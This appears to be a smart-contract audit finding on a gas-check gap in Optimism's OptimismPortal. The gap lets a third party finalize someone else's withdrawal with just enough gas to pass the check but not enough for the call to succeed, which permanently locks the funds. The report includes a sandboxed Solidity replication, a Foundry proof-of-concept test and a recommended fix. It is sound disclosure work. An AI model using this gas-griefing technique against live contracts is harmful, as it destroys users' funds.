obront

high

# Malicious user can finalize other’s withdrawal with less than specified gas limit, leading to loss of funds

## Summary

Transactions to execute a withdrawal from the Optimism Portal can be sent with 5122 less gas than specified by the user, because the check is performed a few operations prior to the call. Because there are no replays on this contract, the result is that a separate malicious user can call `finalizeWithdrawalTransaction()` with a precise amount of gas, cause the withdrawer’s withdrawal to fail, and permanently lock their funds.

## Vulnerability Detail

Withdrawals can be initiated directly from the `L2ToL1MessagePasser` contract on L2. These withdrawals can be withdrawn directly from the `OptimismPortal` on L1. This path is intended to be used only by users who know what they are doing, presumably to save the gas of going through the additional more “user-friendly” contracts.

One of the quirks of the `OptimismPortal` is that there is no replaying of transactions. If a transaction fails, it will simply fail, and all ETH associated with it will remain in the `OptimismPortal` contract. Users have been warned of this and understand the risks, so Optimism takes no responsibility for user error.

However, there is an issue in the implementation of `OptimismPortal` that a withdrawal transaction can be executed with 5122 gas less than the user specified. In many cases, this could cause their transaction to revert, without any user error involved. Optimism is aware of the importance of this property being correct when they write in the comments:

> We want to maintain the property that the amount of gas supplied to the call to the target contract is at least the gas limit specified by the user. We can do this by enforcing that, at this point in time, we still have gaslimit + buffer gas available.

This property is not maintained because of the gap between the check and the execution.

The check is as follows, where `FINALIZE_GAS_BUFFER == 20_000`:
```solidity
require(
    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,
    "OptimismPortal: insufficient gas to finalize withdrawal"
);
```
After this check, we know that the current execution context has at least 20,000 more gas than the gas limit. However, we then proceed to spend gas by (a) assigning the `l2Sender` storage variable, which uses 2900 gas because it’s assigning from a non-zero value, and (b) perform some additional operations to prepare the contract for the external call.

The result is that, by the time the call is sent with `gasleft() - FINALIZE_GAS_BUFFER` gas, `gasleft()` is 5122 lower than it was in the initial check. 

Mathematically, this can be expressed as:

- `gasAtCheck >= gasLimit + 20000`
- `gasSent == gasAtCall - 20000`
- `gasAtCall == gasAtCheck - 5122`

Rearranging, we get `gasSent >= gasLimit + 20000 - 5122 - 20000`, which simplifies to `gasSent >= gasLimit - 5122`.

## Impact

For any withdrawal where a user sets their gas limit within 5122 of the actual gas their execution requires, a malicious user can call `finalizeWithdrawalTransaction()` on their behalf with enough gas to pass the check, but not enough for execution to succeed.

The result is that the withdrawing user will have their funds permanently locked in the `OptimismPortal` contract.

## Proof of Concept

To test this behavior in a sandboxed environment, you can copy the following proof of concept.

Here are three simple contracts that replicate the behavior of the Portal, as well as an external contract that uses a predefined amount of gas.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

library SafeCall {
    /**
     * @notice Perform a low level call without copying any returndata
     *
     * @param _target   Address to call
     * @param _gas      Amount of gas to pass to the call
     * @param _value    Amount of value to pass to the call
     * @param _calldata Calldata to pass to the call
     */
    function call(
        address _target,
        uint256 _gas,
        uint256 _value,
        bytes memory _calldata
    ) internal returns (bool) {
        bool _success;
        assembly {
            _success := call(
                _gas, // gas
                _target, // recipient
                _value, // ether value
                add(_calldata, 0x20), // inloc
                mload(_calldata), // inlen
                0, // outloc
                0 // outlen
            )
        }
        return _success;
    }
}

contract GasUser {
    uint[] public s;

    function store(uint i) public {
        for (uint j = 0; j < i; j++) {
            s.push(1);
        }
    }
}

contract Portal {
    address l2Sender;

    struct Transaction {
        uint gasLimit;
        address sender;
        address target;
        uint value;
        bytes data;
    }

    constructor(address _l2Sender) {
        l2Sender = _l2Sender;
    }

    function execute(Transaction memory _tx) public {
        require(
            gasleft() >= _tx.gasLimit + 20000,
            "OptimismPortal: insufficient gas to finalize withdrawal"
        );

        // Set the l2Sender so contracts know who triggered this withdrawal on L2.
        l2Sender = _tx.sender;

        // Trigger the call to the target contract. We use SafeCall because we don't
        // care about the returndata and we don't want target contracts to be able to force this
        // call to run out of gas via a returndata bomb.
        bool success = SafeCall.call(
            _tx.target,
            gasleft() - 20000,
            _tx.value,
            _tx.data
        );
    }
}
```

Here is a Foundry test that calls the Portal with various gas values to expose this vulnerability:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Portal.sol";

contract PortalGasTest is Test {
    Portal public c;
    GasUser public gu;

    function setUp() public {
        c = new Portal(0x000000000000000000000000000000000000dEaD);
        gu = new GasUser();
    }

    function testGasLimitForGU() public {
        gu.store{gas: 44_602}(1);
        assert(gu.s(0) == 1);
    }

    function _executePortalWithGivenGas(uint gas) public {
        c.execute{gas: gas}(Portal.Transaction({
            gasLimit: 44_602,
            sender: address(69),
            target: address(gu),
            value: 0,
            data: abi.encodeWithSignature("store(uint256)", 1)
        }));
    }

    function testPortalCatchesGasTooSmall() public {
        vm.expectRevert(bytes("OptimismPortal: insufficient gas to finalize withdrawal"));
        _executePortalWithGivenGas(65681);
    }

    function testPortalSucceedsWithEnoughGas() public {
        _executePortalWithGivenGas(70803);
        assert(gu.s(0) == 1);
    }

    function testPortalBugWithInBetweenGasLow() public {
        _executePortalWithGivenGas(65682);
        
        // It now reverts because the array has a length of 0.
        vm.expectRevert();
        gu.s(0);
    }

    function testPortalBugWithInBetweenGasHigh() public {
        _executePortalWithGivenGas(70802);
        
        // It now reverts because the array has a length of 0.
        vm.expectRevert();
        gu.s(0);
    }
}
```
Summarizing the results of this test:
- We verify that the call to the target contract succeeds with 44,602 gas, and set that as gasLimit for all tests.
- When we send 65,681 or less gas, it’s little enough to be caught by the require statement.
- When we send 70,803 or more gas, the transaction will succeed.
- When we send any amount of gas between these two values, the require check is passed but the transaction fails.

## Code Snippet

https://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L310-L329

https://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/libraries/SafeCall.sol#L17-L36

## Tool used

Manual Review

## Recommendation

Instead of using one value for `FINALIZE_GAS_BUFFER`, two separate values should be used that account for the gas used between the check and the call.